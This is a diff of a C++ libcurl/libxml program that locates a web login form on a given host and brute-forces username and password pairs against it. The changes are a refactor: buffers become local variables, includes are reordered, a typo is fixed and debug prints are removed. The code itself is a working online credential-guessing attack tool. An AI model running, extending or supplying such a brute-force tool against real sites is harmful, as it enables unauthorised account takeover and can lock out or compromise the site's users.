@@ -1,10 +1,10 @@
-#include <stdio.h>
 #include <string.h>
 #include <string>
-#include <curl/curl.h>
-#include <libxml/HTMLparser.h>
 #include <iostream>
 #include <list>
+#include <curl/curl.h>
+#include <libxml/HTMLparser.h>
+
 using namespace std;
 
 //
@@ -20,13 +20,6 @@ struct Context{
 	bool containsForm;
 } form;
 
-//
-//  libcurl variables for error strings and returned data
-
-static char errorBuffer[CURL_ERROR_SIZE];
-static string buffer;
-static string bufferNewHost;
-bool successfulLogin = false;
 
 static const char* possibleLoginFields[] = {"login", "your_email", "username"}; // Possible login fields names
 
@@ -57,7 +50,7 @@ static size_t read_callback(void *ptr, size_t size, size_t nmemb, void *userp) {
   return 0; 
 }
 
-static bool init(CURL *&conn, char *url){
+static bool init(CURL *&conn, char *url, string& responceBuffer, char* errorBuffer){
 	CURLcode code;
 
 	curl_global_init(CURL_GLOBAL_DEFAULT);	
@@ -97,7 +90,7 @@ static bool init(CURL *&conn, char *url){
     	return false;
   	}
 
-  	code = curl_easy_setopt(conn, CURLOPT_WRITEDATA, &buffer);
+  	code = curl_easy_setopt(conn, CURLOPT_WRITEDATA, &responceBuffer);
   	if (code != CURLE_OK){
     	fprintf(stderr, "Failed to set write data [%s]\n", errorBuffer);
 
@@ -272,6 +265,7 @@ static bool bruteForceLoginAndPassword(list<string> &logins, list<string> &passw
 	CURLcode code;
 	CURL *curl;
 	string respBuffer;
+	char errBuffer[CURL_ERROR_SIZE];
 	curl_global_init(CURL_GLOBAL_ALL);
 	curl = curl_easy_init();
 	if(!curl){
@@ -281,13 +275,13 @@ static bool bruteForceLoginAndPassword(list<string> &logins, list<string> &passw
 
 	code = curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writer);
 	if (code != CURLE_OK){
-		fprintf(stderr, "Failed to set writer [%s]\n", errorBuffer);
+		cerr<< "Failed to set writer"<<errBuffer<<endl;
 		return false;
 	}
 
 	code = curl_easy_setopt(curl, CURLOPT_WRITEDATA, &respBuffer);
 	if (code != CURLE_OK){
-		fprintf(stderr, "Failed to set write data [%s]\n", errorBuffer);
+		fprintf(stderr, "Failed to set write data [%s]\n", errBuffer);
 		return false;
 	}
 
@@ -327,14 +321,19 @@ static bool bruteForceLoginAndPassword(list<string> &logins, list<string> &passw
 			 }
 		}
 	}
-	cout<<"There is no login or password correspondance \n";
+	cout<<"There is no login or password correspondence \n";
 	return false;
 }
 
 bool startAttack(string& hostName, list<string> &logins, list<string> &passwords, string &login, string &password){
 	CURL *conn = NULL;
 	CURLcode code;
-	if (!init(conn, (char*)hostName.c_str())){
+
+	//  libcurl variables for error strings and returned data
+	char errorBuffer[CURL_ERROR_SIZE];
+	string buffer;
+
+	if (!init(conn, (char*)hostName.c_str(), buffer, errorBuffer)){
 		fprintf(stderr, "Connection initializion failed\n");
 
 		return false;
@@ -375,8 +374,6 @@ bool startAttack(string& hostName, list<string> &logins, list<string> &passwords
 	curl_global_cleanup();
 	string first(form.action);
 	string newHost = hostName + "/" + first;
-	cout<<"new host name ="<<newHost<<endl;
-	cout<<"after c_str ="<<newHost.c_str()<<endl;
 	return bruteForceLoginAndPassword(logins, passwords, form, (char*)newHost.c_str(), login, password);
 }
 
